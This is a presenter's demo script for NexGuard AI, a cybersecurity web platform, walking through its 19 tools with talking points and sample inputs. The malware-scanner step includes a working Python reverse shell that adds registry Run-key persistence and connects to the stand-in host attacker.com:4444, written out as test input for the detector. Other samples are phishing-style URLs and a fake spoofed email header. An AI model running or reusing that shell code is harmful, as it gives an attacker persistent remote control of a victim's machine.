# NexGuard AI — Complete Demo Script
**Presenter:** Malav Mehta  
**Platform:** NexGuard AI v2.0  
**Duration:** ~45–60 minutes (full demo) | ~20 minutes (condensed)  
**App URL:** http://localhost:5173

---

## PRE-DEMO CHECKLIST

Before presenting, verify:
- [ ] Backend running: `cd Backend && npm start` (port 3001)
- [ ] Frontend running: `cd frontend && npm run dev` (port 5173)
- [ ] MongoDB Atlas connected (check terminal — no connection errors)
- [ ] Open browser to http://localhost:5173
- [ ] Clear localStorage: open DevTools → Console → type `localStorage.clear()` → Enter
- [ ] Have demo credentials ready: `demo@test.com` / `SecurePass123`

---

## OPENING (2 minutes)

> "Welcome everyone. Today I'm going to walk you through NexGuard AI — a full-stack, AI-powered cybersecurity platform I built from scratch. It gives security teams, developers, and analysts access to 19 professional-grade security tools in one unified interface — no switching between 10 different websites."

> "We're going to go through every single tool live, in real time. I'll show you both what happens when something is safe, and what happens when something is a threat. Let's get into it."

---

## SECTION 1 — ONBOARDING

### STEP 01: Registration & Email Flow

**What to do:**
1. Navigate to http://localhost:5173
2. Legal disclaimer appears → Click **I Understand**
3. Click **Get Started** or **Sign Up**
4. Fill in: Name: `Demo User`, Email: `demo@test.com`, Password: `SecurePass123`
5. Click **Register**

**Talking points:**
> "When a user registers, the backend validates the credentials, hashes the password with bcrypt — 10 rounds — and stores it in MongoDB Atlas. Simultaneously, a JWT token is issued that expires in 7 days, so the user stays logged in securely."

> "We're also sending a welcome email through Brevo's transactional email API. The user gets a branded NexGuard AI welcome email — this happens asynchronously, so it doesn't block the registration response."

**Expected result:** Redirect to Dashboard. Email arrives at `demo@test.com`.

---

### STEP 02: Dashboard Overview

**What to do:**
1. Point to the stat cards at the top
2. Show the sidebar with 5 tool groups
3. Show the Threat Ticker scrolling at the bottom

**Talking points:**
> "The dashboard shows live aggregate stats — threats blocked, scans run today, total CVEs in the database, uptime. These update in real time."

> "The sidebar organizes all 19 tools into five groups: AI Tools for threat analysis, Security Tools for operational work, Phase 2 Advanced Tools, and the Live Intel feed. Everything is accessible in one click."

> "The threat ticker at the bottom scrolls recent security events. This gives a sense of the current threat landscape without needing to go anywhere."

---

### STEP 03: Scan History Workspace

**What to do:**
1. Click **Scan History** in the sidebar
2. Show the table of past scans (paginated)

**Talking points:**
> "Every scan any user runs is saved to MongoDB. The workspace shows your complete history — what you scanned, when, and what the result was. This is per-user, authenticated via JWT. Guest users see a prompt to register."

---

## SECTION 2 — AI TOOLS (8 Engines)

### STEP 04: AI Security Chat

**What to do:**
1. Click **AI Security Chat**
2. Type: `"Explain how SQL injection works and how to prevent it"`
3. Wait for Claude's response
4. Then type: `"What is CVE-2024-6387 and how serious is it?"`

**Talking points:**
> "This is powered by Anthropic's Claude 3.5 Haiku model. It's a security-specialized AI chat — you can ask it anything about vulnerabilities, attack techniques, defense strategies, or incident response."

> "Unlike a general AI chatbot, this is tuned for security context. Ask it about a CVE and it gives you severity, affected versions, and patch guidance. It's rate-limited to 20 requests per minute per user."

**Demo prompts (copy-paste ready):**
- `"Explain how SQL injection works and how to prevent it"`
- `"What is CVE-2024-6387?"`
- `"Create a ransomware incident response checklist"`

---

### STEP 05: Phishing URL Detector

**What to do:**
1. Click **Phishing Detector**
2. Paste: `http://paypal-security-login.tk/verify/account`
3. Click Analyze
4. Show result (expected: HIGH RISK 94%+)
5. Then paste: `https://google.com` — show SAFE result

**Talking points:**
> "This sends the URL to Claude which analyzes 12 different signals: domain age, lookalike brand names, suspicious TLD, keyword patterns, URL structure, redirect chains. It doesn't just look up a database — it reasons about why a URL is suspicious."

> "This URL uses a .tk domain — a free TLD often used for phishing — with 'paypal' and 'security' as keywords and a suspicious path. Claude catches all of these and gives us a high-risk verdict with explanation."

**More demo URLs:**
- HIGH RISK: `https://secure-bankofamerica-login.xyz`
- SAFE: `https://github.com`

---

### STEP 06: Deepfake Image Detector

**What to do:**
1. Click **Deepfake Detector**
2. Upload any face photo (download one from Google Images first)
3. Click Analyze
4. Show the authenticity score

**Talking points:**
> "Upload any image and the AI analyzes it for signs of AI generation or deepfake manipulation. It looks at facial geometry consistency, lighting artifacts, background coherence, skin texture patterns, and edge artifacts around the hairline and ears — common tells for deepfake-generated images."

> "It returns an authenticity score from 0 to 100. A low score means likely manipulated. A high score means likely authentic. As deepfakes get more sophisticated, this tool becomes increasingly important for media verification."

---

### STEP 07: Email Header Analyzer

**What to do:**
1. Click **Email Analyzer**
2. Paste this phishing header:
```
From: security@paypa1.support
Reply-To: hacker99@gmail.com
X-Originating-IP: 185.220.101.47
DKIM: FAIL
SPF: FAIL
DMARC: FAIL
Subject: Urgent: Your account has been suspended
```
3. Click Analyze
4. Show result (expected: PHISHING EMAIL DETECTED)

**Talking points:**
> "Paste in any email header and the AI parses every field. Notice this one: the FROM address uses 'paypa1' with the number 1 instead of the letter l — a classic homoglyph attack. The Reply-To is a Gmail address, which legitimate companies never do. DKIM, SPF, and DMARC all fail — the email wasn't actually sent from PayPal's servers."

> "The X-Originating-IP is 185.220.101.47 — which we'll see in a moment is a known Tor exit node. This email is flagged as a phishing attempt across 7 different indicators."

---

### STEP 08: Malware Code Scanner

**What to do:**
1. Click **Malware Scanner**
2. Paste this code:
```python
import socket, subprocess, os, winreg

# Establish persistence via registry
key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, 
    winreg.KEY_SET_VALUE)
winreg.SetValueEx(key, "WindowsUpdate", 0, winreg.REG_SZ, os.path.abspath(__file__))

# Reverse shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("attacker.com", 4444))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
```
3. Click Analyze

**Talking points:**
> "This is a Python reverse shell — a common malware payload. It does two things: first, it adds itself to the Windows registry Run key for persistence — so it survives reboots. Second, it connects back to an attacker's server and spawns a shell."

> "The AI identifies both behaviors: the reverse shell pattern and the registry persistence. It flags this as malware and explains what each section of code does. This is useful for triaging suspicious files or reviewing code from unknown sources."

---

### STEP 09: AI Penetration Testing Assistant

**What to do:**
1. Click **Pentest Assistant**
2. Type: `"Create a SQL injection testing methodology for a web application"`

**Talking points:**
> "The penetration testing assistant helps ethical hackers and security researchers create structured test plans. Ask it for a methodology and it produces a step-by-step plan covering reconnaissance, exploitation, post-exploitation, and reporting."

> "Important: this tool includes ethical use disclaimers and is designed for authorized security testing only. The AI refuses to provide guidance for unauthorized access."

**More demo prompts:**
- `"XSS testing checklist for a React application"`
- `"Network penetration test methodology for a small business"`

---

## SECTION 3 — SECURITY TOOLS (7 Tools)

### STEP 10: WebRTC IP Leak Test

**What to do:**
1. Click **WebRTC Leak Test**
2. Click **Run WebRTC Leak Test**
3. Results appear (your real IP shows)

**Talking points:**
> "This tool runs entirely in your browser — no backend call at all. It uses the WebRTC API which browsers use for video calling. When you create an RTCPeerConnection, the browser reveals your real IP through ICE candidates — even if you're using a VPN."

> "This is a real privacy vulnerability. VPN users think they're anonymous, but any website running this JavaScript in the background can see their real IP. We're showing that IP right now — your real IP, not your VPN's."

---

### STEP 11: Password Tools

**What to do:**
1. Click **Password Tools**
2. Type `password123` → show VERY WEAK
3. Type `MyDog2019!` → show MEDIUM
4. Type `Tr0ub4dor&3#Kx9` → show VERY STRONG with centuries crack time
5. Switch to Generator → set 32 characters, all options on → click Generate → show Copy

**Talking points:**
> "Two tools in one. The strength checker uses zxcvbn — a password strength estimator that thinks like a real attacker. It considers dictionary words, common patterns, and substitutions. 'password123' with a 1 replacing the l — still weak. Our strong example would take centuries to crack."

> "The generator uses window.crypto — the browser's cryptographically secure random number generator. Zero server calls, zero logging. The password never leaves your device."

---

### STEP 12: CVE Intelligence

**What to do:**
1. Click **CVE Intelligence**
2. Search: `CVE-2021-44228`
3. Show the Log4Shell result (CVSS 10.0)
4. Search: `CVE-2024-6387` (regreSSHion)

**Talking points:**
> "This pulls live data from the NIST National Vulnerability Database — the authoritative source for CVE information. Search for any CVE ID and get the full details: CVSS score, affected versions, vulnerability description, and remediation advice."

> "Log4Shell — CVE-2021-44228 — is one of the most critical vulnerabilities ever discovered. CVSS 10.0, the maximum. It affected millions of systems worldwide. Showing this gives the audience a sense of the severity spectrum we're working with."

---

### STEP 13: Threat Intel Feed

**What to do:**
1. Click **Threat Intel Feed**
2. Browse the cards
3. Type "ransomware" in the search box — show filtering
4. Click any card to expand it

**Talking points:**
> "The Threat Intel Feed aggregates data from CISA's Known Exploited Vulnerabilities catalog and NIST NVD. This is different from the Live Feed — this is curated intelligence with search and filtering."

> "Security teams use feeds like this for morning threat briefings. Search 'ransomware' to filter down to relevant threats. Each card shows the CVE ID, severity, affected systems, and what action to take."

---

### STEP 14: IP Reputation Check

**What to do:**
1. Click **IP Reputation**
2. Enter: `185.220.101.47` → click Check
3. Show result (HIGH abuse confidence, Tor exit node, hundreds of reports)
4. Enter: `8.8.8.8` → show CLEAN (Google DNS)

**Talking points:**
> "This queries AbuseIPDB — a crowd-sourced database of malicious IP addresses. Enter an IP and get its abuse confidence score from 0 to 100, country, ISP, and a history of what it's been reported for."

> "185.220.101.47 is a known Tor exit node that's been reported hundreds of times for SSH attacks, DDoS participation, and port scanning. The abuse score will be very high. Now compare that to 8.8.8.8 — Google's DNS server — which comes back completely clean."

---

## SECTION 4 — PHASE 2 ADVANCED TOOLS (5 Tools)

### STEP 15: VirusTotal Scanner

**What to do:**
1. Click **VirusTotal Scanner**
2. Enter hash: `44d88612fea8a8f36de82e1278abb02f`
3. Show results (50+ engines detect it)
4. Enter URL: `https://google.com` → show clean result

**Talking points:**
> "VirusTotal scans files and URLs against 72 different antivirus engines simultaneously. The hash I just entered is the EICAR test file — a harmless file that every antivirus engine is trained to detect as a test threat. Watch how many engines flag it."

> "In a real scenario, you'd paste in a suspicious file hash or URL. If even one or two major engines flag it, that's worth investigating. If 50 out of 72 flag it, you have a clear problem."

---

### STEP 16: DNS & WHOIS Lookup

**What to do:**
1. Click **DNS & WHOIS**
2. Enter: `google.com` → show all records (A, MX, NS, TXT with SPF/DKIM)
3. Enter: `paypal-security-login.tk` → show suspicious WHOIS

**Talking points:**
> "DNS lookup retrieves all the records for a domain — A records for IP addresses, MX records for mail servers, TXT records containing SPF and DKIM authentication, and NS records for nameservers. WHOIS gives you the registrant information."

> "Google.com was registered in 1997, has clear registrant info, and robust authentication records. The suspicious .tk domain? Registered days ago, WHOIS hidden by a privacy service, no SPF or DKIM. Every indicator says this is a phishing domain."

---

### STEP 17: SSL/TLS Analyzer

**What to do:**
1. Click **SSL/TLS Analyzer**
2. Enter: `expired.badssl.com` → show F grade, expired certificate
3. Enter: `google.com` → show A+ grade, TLS 1.3

**Talking points:**
> "This analyzes the SSL/TLS certificate of any domain — the technology that makes HTTPS work. It checks the certificate validity, issuer chain, TLS version, and cipher strength."

> "badssl.com is a test site built specifically for security demos. The 'expired' subdomain has an intentionally expired certificate. See the grade — F — with the exact expiry date shown. Google.com gets an A+ with TLS 1.3, the latest and most secure version of the protocol."

---

### STEP 18: Subdomain Enumeration

**What to do:**
1. Click **Subdomain Enumeration**
2. Enter: `tesla.com` → click Enumerate
3. Show the list of discovered subdomains

**Talking points:**
> "Subdomain enumeration is one of the first things an attacker does in the reconnaissance phase. They're looking for forgotten servers — a staging environment, an old admin panel, a development server — that hasn't been patched."

> "We found subdomains like api.tesla.com, app.tesla.com, cdn.tesla.com. This maps the entire attack surface. A defender needs to know this list just as well as an attacker would — so they can make sure every one of those subdomains is properly secured."

---

### STEP 19: Breach Monitor

**What to do:**
1. Click **Breach Monitor**
2. Enter: `test@adobe.com` → show Adobe 2013 breach (153M records)
3. Enter: `demo@linkedin.com` → show LinkedIn 2012 breach (117M)
4. Enter: `safe@example.com` → show no breaches found

**Talking points:**
> "This checks if an email address appears in known data breaches. When the Adobe breach happened in 2013 — 153 million records — attackers got email addresses and encrypted passwords. They then used those credentials to try logging into every other service."

> "This is called credential stuffing. If your email shows up in 5 breaches, your old passwords from those services are probably being tried on your bank, your email, your company VPN right now. Knowing is the first step to protecting yourself."

---

## SECTION 5 — LIVE INTEL

### STEP 20: Live Global Threat Feed

**What to do:**
1. Click **Live Global Threat Feed** (look for LIVE badge in sidebar)
2. Show the pulsing LIVE badge
3. Browse the CISA KEV cards
4. Click one to expand
5. Click **Alert All Users** button

**Talking points:**
> "This is the crown jewel of the platform — a live feed pulling directly from CISA's Known Exploited Vulnerabilities catalog right now, in real time. Every card represents a vulnerability that CISA has confirmed is being actively exploited by real attackers in the wild."

> "The polling runs every 30 seconds. When a new critical CVE is added, it appears here immediately. The 'Alert All Users' button broadcasts a notification to every registered user — useful for security teams that need to push urgent patch notifications."

> "This is what makes NexGuard AI more than a toolbox. It's a real-time threat intelligence platform."

---

## CLOSING (3 minutes)

> "So that's all 19 tools across 5 categories — 8 AI-powered engines and 11 security intelligence tools — all in one platform, built with React, Node.js, MongoDB, and the Anthropic Claude API."

> "What makes this different is that it's not a collection of scripts. Everything is integrated: your scan history is saved, all tools are authenticated, and the platform scales with real API-based data. Everything except the Anthropic AI API runs on completely free tiers."

> "I'm happy to demo any tool again, answer questions about the architecture, or walk through the code for any part of the system. What questions do you have?"

---

## BACKUP DEMOS (if time allows or questions arise)

| Tool | Best follow-up demo |
|------|---------------------|
| AI Chat | Ask about a current CVE in the news |
| Phishing | Use an obvious safe URL like `https://anthropic.com` |
| WebRTC | Ask someone with a VPN to try it — real IP still shows |
| CVE Intel | Search `CVE-2023-44487` (HTTP/2 Rapid Reset, CVSS 7.5) |
| VirusTotal | Scan URL `http://malware-test.eicar.org/` |
| Password | Try audience member's "strong" password |

---

## TROUBLESHOOTING

| Problem | Fix |
|---------|-----|
| Backend not responding | `cd Backend && npm start` — check port 3001 is free |
| API errors | Check `.env` has all keys: ANTHROPIC_API_KEY, VIRUSTOTAL_API_KEY, ABUSEIPDB_API_KEY |
| Login not working | Run in console: `localStorage.clear()` then refresh |
| Email not arriving | Verify `mehtamalav59@gmail.com` is set as FROM_EMAIL in `.env` |
| Rate limit hit | Wait 60 seconds (VirusTotal: 4 req/min on free tier) |
| Disclaimer keeps showing | Run in console: `localStorage.removeItem("ng_disclaimer_v2")` |

---

## QUICK REFERENCE — ALL DEMO INPUTS

| Tool | Input | Expected Result |
|------|-------|----------------|
| Registration | demo@test.com / SecurePass123 | JWT issued, welcome email |
| AI Chat | "Explain SQL injection" | Detailed technical response |
| Phishing | paypal-security-login.tk/verify/account | HIGH RISK 94%+ |
| Deepfake | Any face image | Authenticity score 0–100 |
| Email Header | From: security@paypa1.support | PHISHING DETECTED |
| Malware | Python reverse shell code | MALWARE DETECTED |
| Pentest | "SQL injection methodology" | Step-by-step plan |
| WebRTC | Click Run Test | Real IP revealed |
| Password | password123 → Tr0ub4dor&3#Kx9 | Weak → Very Strong |
| CVE Intel | CVE-2021-44228 | Log4Shell CVSS 10.0 |
| Threat Intel | Search "ransomware" | Filtered feed |
| IP Reputation | 185.220.101.47 | HIGH RISK, Tor exit |
| VirusTotal | 44d88612fea8a8f36de82e1278abb02f | 50+ detections |
| DNS/WHOIS | paypal-security-login.tk | Newly registered, hidden |
| SSL/TLS | expired.badssl.com | Grade F, expired |
| Subdomains | tesla.com | 20–50 subdomains |
| Breach Monitor | test@adobe.com | Adobe 2013, 153M records |
| Live Feed | (auto-loads) | CISA KEV cards live |

---

*NexGuard AI v2.0 — Demo Script | Malav Mehta | malav.mehta@rocketmail.com*
